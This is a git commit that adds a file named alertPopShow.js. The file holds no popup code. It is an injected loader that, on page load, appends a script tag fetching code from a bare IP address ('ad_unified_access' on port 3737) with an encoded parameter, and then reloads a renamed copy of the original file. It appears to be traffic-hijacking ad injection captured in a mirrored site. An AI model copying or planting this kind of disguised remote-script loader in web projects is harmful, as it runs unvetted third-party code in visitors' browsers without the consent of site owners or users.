222bbf910b8b066dba26080c2707a4849e4a376d
Richar-Dada <631151149@qq.com>
2018-09-22 13:30:34 +0800

    first commit

---
+++ alertPopShow.js
@@ -0,0 +1,5 @@
+var _atn_obj_ = new Object; 
+_atn_obj_.oldurl = 'alertPopShow.js-cHVzaA=1537593447.js'/*tpa=http://www.trankeyfx.com/js/alertPopShow.js?cHVzaA=1537593447*/; 
+_atn_obj_.unified_url = 'http://183.59.53.202:3737/ad_unified_access?SP=ABzs/Lz4PPzc/Px8/Mz8nOyr/OyczRmJuDqN/SztHSztHSzoPOg8vLz87Pz4POg87KzMjKxszLy8iDzsrMyMrGzMvLyM/GyMnGy8mDy83Nyw=='; 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0); 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
